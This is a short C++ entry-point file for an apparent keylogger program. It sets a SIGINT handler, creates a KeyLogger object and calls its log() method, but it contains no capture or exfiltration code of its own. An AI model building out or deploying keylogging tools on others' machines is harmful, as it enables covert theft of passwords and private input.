
#ifndef MAIN_CPP
#define MAIN_CPP

#include "header.h"

KeyLogger* mKeyLogger;

int main(int argc, char **argv)
{
	signal(SIGINT, signalHandler);

	mKeyLogger = new KeyLogger(argc, argv);
	mKeyLogger->log();

        if(mKeyLogger != NULL)
	{
		delete mKeyLogger;
	}

	exit(0);
}

#endif
